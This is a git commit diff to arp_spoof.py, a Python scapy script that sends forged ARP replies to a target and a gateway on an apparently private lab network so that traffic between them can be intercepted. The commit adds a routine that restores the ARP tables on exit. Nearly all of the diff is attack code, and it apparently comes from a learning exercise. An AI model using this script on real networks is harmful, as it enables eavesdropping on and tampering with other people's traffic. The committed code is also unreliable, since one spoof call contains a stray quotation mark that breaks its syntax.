6c7696579c04535981d1619c96f93ba61da1b58c
FerLK <luiz.citu@gmail.com>
2021-08-25 16:56:23 -0300

    add a restore original ip for target

--- arp_spoof.py
+++ arp_spoof.py
@@ -8,7 +8,6 @@ def get_mac(ip):
     broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
     answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
-
     return answered_list[0][1].hwsrc
 
 
@@ -20,14 +19,25 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose = False)
 
 
-sent_packets_count = 0
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst = destination_ip, hwdst = destination_mac , psrc = source_ip, hwsrc = source_mac)
+    scapy.send(packet, count = 4, verbose = False)
+    print(packet.show())
+
+target_ip = "10.0.2.7"
+gateway_ip = "10.0.2.1"
 try:
+    sent_packets_count = 0
     while True:
         #echo1 > /proc/sys/net/ipv4/ip_forward
-        spoof("10.0.2.1", "10.0.2.7")
-        spoof("10.0.2.7", "10.0.2.1")
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip")
         sent_packets_count += 2
         print("\r[+] Packets sent: {}".format(sent_packets_count), end ="")
         time.sleep(2)
 except KeyboardInterrupt:
     print(" > quit")
+    restore(gateway_ip, target_ip)
+    restore(target_ip,gateway_ip)
